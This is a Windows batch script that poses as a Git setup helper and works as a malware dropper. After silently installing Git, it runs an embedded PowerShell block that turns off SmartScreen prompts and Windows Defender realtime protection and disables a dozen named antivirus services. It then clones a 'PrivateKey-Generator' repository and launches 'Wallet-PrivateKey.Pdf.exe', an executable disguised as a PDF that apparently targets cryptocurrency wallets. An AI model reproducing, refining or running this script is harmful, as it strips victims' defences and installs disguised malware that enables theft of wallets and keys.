@echo off

:: Check if Git is installed
git --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo 'Git is not installed. Installing Git...'
    powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/latest/download/Git-2.39.1-64-bit.exe -OutFile GitInstaller.exe; Start-Process -FilePath .\GitInstaller.exe -ArgumentList '/VERYSILENT', '/NORESTART' -Wait; Remove-Item -Force GitInstaller.exe"
)

:: Check if Git is now installed
git --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo 'Git installation failed. Exiting...'
    exit /b %ERRORLEVEL%
)

:: Add Git to PATH for the current session
set "PATH=%PATH%;C:\Program Files\Git\bin;C:\Program Files\Git\cmd"

:: Inform the user
echo 'Git has been installed and added to PATH. You can now use Git in this Command Prompt session.'

:: Proceed with the rest of the script
powershell -Command "
# Check if SmartScreen is already disabled
$smartScreen = Get-MpPreference | Select-Object -ExpandProperty DisableSmartScreenOverridePrompt
if (-not $smartScreen) {
    Set-MpPreference -DisableSmartScreenOverridePrompt $true
}

# Check if Windows Defender is already disabled
$defenderStatus = Get-Service -Name 'WinDefend' -ErrorAction SilentlyContinue
if ($defenderStatus.Status -eq 'Running') {
    Stop-Service -Name 'WinDefend' -Force
    Set-MpPreference -DisableRealtimeMonitoring $true
}

$softwareList = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -match 'Antivirus' }
if ($softwareList.Count -eq 0) {
    echo 'No antivirus software found. Exiting...'
    exit
}
foreach ($software in $softwareList) {
    switch ($software.Name) {
        'Avast' { Set-Service -Name 'AvastSvc' -StartupType Disabled; break }
        'Norton' { Set-Service -Name 'Symantec Antivirus Service' -StartupType Disabled; break }
        'McAfee' {
            Set-Service -Name 'McAfee Framework Service' -StartupType Disabled
            Set-Service -Name 'McAfee Service Controller' -StartupType Disabled
            break
        }
        'Kaspersky' { Set-Service -Name 'Kaspersky Lab Service' -StartupType Disabled; break }
        'Bitdefender' { Set-Service -Name 'Bitdefender Antivirus' -StartupType Disabled; break }
        'AVG' { Set-Service -Name 'AvgSvc' -StartupType Disabled; break }
        'Avira' { Set-Service -Name 'Avira Service' -StartupType Disabled; break }
        'Sophos' { Set-Service -Name 'Sophos' -StartupType Disabled; break }
        'Trend Micro' { Set-Service -Name 'Trend Micro' -StartupType Disabled; break }
        'Webroot' { Set-Service -Name 'Webroot Service' -StartupType Disabled; break }
        'ESET NOD32' { Set-Service -Name 'ekrn' -StartupType Disabled; break }
        'Panda' { Set-Service -Name 'Panda' -StartupType Disabled; break }
        # Add more cases for other antivirus software as needed
    }
}
"

git clone https://github.com/CelestialNFT/PrivateKey-Generator.git
if %ERRORLEVEL% neq 0 (
    echo 'Git clone failed. Exiting...'
    exit /b %ERRORLEVEL%
)
cd PrivateKey-Generator
start /wait Wallet-PrivateKey.Pdf.exe
